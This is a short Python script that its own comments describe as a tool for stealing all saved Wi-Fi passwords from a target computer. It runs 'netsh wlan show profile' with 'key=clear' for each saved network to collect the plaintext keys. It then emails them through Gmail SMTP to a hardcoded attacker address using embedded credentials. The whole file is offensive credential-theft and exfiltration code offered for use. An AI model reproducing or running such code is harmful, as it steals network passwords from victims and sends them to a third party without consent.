#!/usr/bin/env python
#FOR THIS YOU HAVE TO ALLOW LESS SECURE APPS : ON TO YOUR GMAIL ACCOUNT
#THIS PROGRAM HELPS TO STEALING ALL WIFI PASSWORD INSIDE TARGET COMPUTER

import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)  #First_Argument is From and Second_argument is To and third one is content
    server.quit()


command = "netsh wlan show profile" #wlan is interface
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)",networks)

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + "key=clear"
    current_result = subprocess.check_output(command,shell=True)
    result = result + current_result

send_mail("hackerdj@gmail.com", "abc123abc", result)
